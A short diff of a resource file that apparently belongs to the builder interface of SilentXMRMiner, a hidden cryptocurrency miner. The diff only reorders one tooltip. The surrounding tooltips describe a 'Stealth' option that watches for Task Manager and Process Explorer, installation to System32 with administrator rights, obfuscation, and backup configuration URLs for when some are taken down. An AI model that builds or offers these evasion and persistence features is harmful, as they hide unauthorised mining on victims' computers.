@@ -120,6 +120,10 @@
   <metadata name="TooltipHelper.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
     <value>17, 17</value>
   </metadata>
+  <data name="Label13.ToolTip" xml:space="preserve">
+    <value>The programs that the "Stealth" option should check for. Separate the programs with a comma (,) just like the default entry.
+Default: Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe</value>
+  </data>
   <data name="Label7.ToolTip" xml:space="preserve">
     <value>Will try to install to System32, if unsuccessful it will try to install to the path chosen in the "Install" tab. It's recommended to enable this when using 'Run as Administrator'.
 This command requires Administrator privileges!
@@ -135,10 +139,6 @@ After you have obfuscated the file press OK on the message box that appears to m
 You can enter multiple URLs for backup in case any get taken down or stop working by separating them with a comma (,) like so: url1,url2,url3
 If the URL can't be reached or if the configuration is wrong, it will try the next URL or if none work then it will use the settings declared in the builder instead.
 You can find the specific format for the configuration and other helpful things on the SilentXMRMiner GitHub wiki: https://github.com/UnamSanctam/SilentXMRMiner/wiki.</value>
-  </data>
-  <data name="Label13.ToolTip" xml:space="preserve">
-    <value>The programs that the "Stealth" option should check for. Separate the programs with a comma (,) just like the default entry.
-Default: Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe</value>
   </data>
   <assembly alias="System.Drawing" name="System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
   <data name="$this.Icon" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
